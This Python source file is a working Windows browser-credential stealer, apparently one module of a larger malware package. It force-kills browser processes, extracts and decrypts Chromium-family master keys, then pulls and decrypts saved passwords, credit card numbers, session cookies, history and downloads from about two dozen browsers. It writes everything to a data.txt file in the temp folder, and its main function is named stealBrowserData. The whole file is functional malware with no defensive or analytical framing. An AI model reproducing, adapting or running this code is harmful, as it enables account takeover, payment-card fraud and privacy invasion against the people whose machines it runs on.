from Crypto.Cipher import AES
from __init__ import local, roaming
import os, shutil, sqlite3, base64
from json import loads
from win32crypt import CryptUnprotectData
from subprocess import run, DEVNULL
from tempfile import TemporaryDirectory, NamedTemporaryFile
from datetime import datetime, timedelta

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': True
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': True
    }
}

browsers = {
    'avast': local + '\\AVAST Software\\Browser\\User Data',
    'amigo': local + '\\Amigo\\User Data',
    'torch': local + '\\Torch\\User Data',
    'kometa': local + '\\Kometa\\User Data',
    'orbitum': local + '\\Orbitum\\User Data',
    'cent-browser': local + '\\CentBrowser\\User Data',
    '7star': local + '\\7Star\\7Star\\User Data',
    'sputnik': local + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': local + '\\Vivaldi\\User Data',
    'chromium': local + '\\Chromium\\User Data',
    'chrome-canary': local + '\\Google\\Chrome SxS\\User Data',
    'chrome': local + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': local + '\\Epic Privacy Browser\\User Data',
    'msedge': local + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': local + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': local + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': local + '\\Microsoft\\Edge Dev\\User Data',
    'uran': local + '\\uCozMedia\\Uran\\User Data',
    'yandex': local + '\\Yandex\\YandexBrowser\\User Data',
    'brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': local + '\\Iridium\\User Data',
    'coccoc': local + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

browsers_to_kill = [
    'chrome.exe',
    'firefox.exe',
    'msedge.exe',
    'brave.exe',
    'opera.exe',
    'vivaldi.exe',
    'yandex.exe',
    'avast.exe',
    'amigo.exe',
    'torch.exe',
    'kometa.exe',
    'orbitum.exe',
    'centbrowser.exe',
    '7star.exe',
    'sputnik.exe',
    'epic.exe',
    'iridium.exe',
    'coccoc.exe',
    'opera_gx.exe'
]

def browser_cookies():
    def kill_browsers():
        for browser in browsers_to_kill:
            try:
                run(f'taskkill /F /IM {browser}', shell=True, stdout=DEVNULL, stderr=DEVNULL)
            except Exception:
                pass

    def get_master_key(path: str):
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path + '\\Local State', 'r', encoding='utf-8').read():
            return

        with open(path + '\\Local State', 'r', encoding='utf-8') as f:
            c = f.read()
        local_state = loads(c)

        key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        key = key[5:]
        key = CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    def convert_chrome_time(chrome_time):
        return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

    def decrypt_password(buff: bytes, key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def write_browser_info_to_temp(info):
        with NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
            temp_file.write(info)
        return temp_file.name

    def save_results(browser_name, type_of_data, content, temp_dir):
        if not os.path.exists(temp_dir):
            os.mkdir(temp_dir)
        if content != '' and content is not None:
            open(os.path.join(temp_dir, f'{browser_name}_{type_of_data}.txt'), 'w', encoding='utf-8').write(content)
    def get_data(path: str, profile: str, key, type_of_data, temp_dir):
        db_file = f'{path}\\{profile}{type_of_data["file"]}'
        if not os.path.exists(db_file):
            return ''

        result = ''
        temp_db = os.path.join(temp_dir, 'temp_db')

        try:
            shutil.copy(db_file, temp_db)
        except Exception as e:
            return result

        conn = None
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            cursor.execute(type_of_data['query'])

            for row in cursor.fetchall():
                row = list(row)
                if type_of_data['decrypt']:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes) and row[i]:
                            try:
                                row[i] = decrypt_password(row[i], key)
                            except Exception as e:
                                row[i] = 'Error decrypting'
                if type_of_data['query'] == 'history':
                    if row[2] != 0:
                        row[2] = convert_chrome_time(row[2])
                    else:
                        row[2] = '0'
                try:
                    result += '\n'.join([f'{col}: {val}' for col, val in zip(type_of_data['columns'], row)]) + '\n\n'
                except Exception as e:
                    pass
        except sqlite3.OperationalError as e:
            pass
        finally:
            if conn:
                conn.close()
            try:
                os.remove(temp_db)
            except Exception:
                pass

        return result
    def installed_browsers():
        available = []
        for x in browsers.keys():
            if os.path.exists(browsers[x] + '\\Local State'):
                available.append(x)
        return available

    def stealBrowserData():
        all_browser_info = ''

        with TemporaryDirectory() as temp_dir:
            available_browsers = installed_browsers()

            for browser in available_browsers:
                browser_path = browsers[browser]
                master_key = get_master_key(browser_path)

                for data_type_name, data_type in data_queries.items():
                    profile = 'Default' if browser not in ['opera-gx'] else ''
                    data = get_data(browser_path, profile, master_key, data_type, temp_dir)
                    save_results(browser, data_type_name, data, temp_dir)

                    if data:
                        all_browser_info += f'Browser: {browser}\nData Type: {data_type_name}\n{data}\n\n'

            if all_browser_info:
                with NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
                    temp_file.write(all_browser_info)
                    temp_file_path = temp_file.name
                temp_folder = os.getenv('TEMP')
                new_file_name = "data.txt"
                os.rename(temp_file_path, os.path.join(temp_folder, new_file_name))

                return os.path.join(temp_folder, new_file_name)


    return stealBrowserData()

print(browser_cookies())
